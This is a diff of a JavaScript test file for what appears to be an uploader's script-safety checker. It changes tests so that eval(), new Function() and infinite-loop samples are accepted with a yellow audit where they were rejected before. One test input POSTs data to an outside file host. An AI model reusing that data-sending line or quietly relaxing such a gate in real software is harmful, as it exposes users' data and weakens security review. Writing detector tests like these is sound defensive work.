@@ -123,10 +123,11 @@ assert.equal(JSON.stringify(uploader).includes('api.example'),false);
 assert.equal(JSON.stringify(uploader).includes('riskEvidence'),false);count+=3;
 for(const [source,word] of [['eval(code);','eval()'],['new Function(code);','动态创建函数'],['while(true){}','循环']]){
   const report=ejs(source),visible=toUploaderCodeCheck(report);
-  assert.equal(report.gate,'reject');
+  assert.equal(report.gate,'accept');
+  assert.equal(report.audit,'yellow');
   assert.ok(visible.findings.some(finding=>finding.ruleId==='SCRIPT-RISK'&&finding.title.includes(word)&&finding.line===2));
   assert.equal(/"M[125]"/.test(JSON.stringify(visible)),false);
-  assert.ok(formatUploaderCodeCheckError(report).includes(word));count+=4;
+  assert.equal(formatUploaderCodeCheckError(report), '');count+=4;
 }
 assert.ok(rules(ejs('globalThis.utils = {};')).includes('L5'));count++;
 const reusedAsset=ejs('const avatarUrl="https://files.catbox.moe/a.png"; fetch(avatarUrl,{method:"POST",body:data});');
